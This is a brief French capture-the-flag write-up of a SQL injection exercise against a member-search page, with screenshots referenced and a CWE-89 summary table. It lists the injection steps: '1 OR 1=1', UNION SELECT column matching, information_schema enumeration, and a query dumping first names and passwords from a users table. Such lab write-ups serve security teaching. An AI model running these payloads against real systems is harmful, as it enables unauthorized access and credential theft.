# Objectif

![image](Screenshots/SearchMember.png)

Voici notre porte nouvelle porte d'entrée.

## Détection 

![image](Screenshots/ErrorMessage.png)

1 OR 1=1 => contournement de la requête

## Extraction colonnes

UNION SELECT avec le bon nombre de colonnes (2 ici)

![image](Screenshots/Column.png)

## Nom de la base

database() => Member_Sql_Injection

## Liste des tables

via information_schema.tables → users

## Liste des colonnes

via information_schema.columns → trouvé countersign

## Découvertes de consignes

```1 UNION SELECT first_name,commentaire FROM users```

![image](Screenshots/HiddenMessage.png)

## Extraction des données

UNION SELECT first_name, countersign FROM users

## Obtention du flag

```echo -n "fortytwo" | sha256sum ```

| Étape | Faille | Référence |
|-------|--------|-----------|
| Base de données exposées | Injection SQL | CWE-89 |
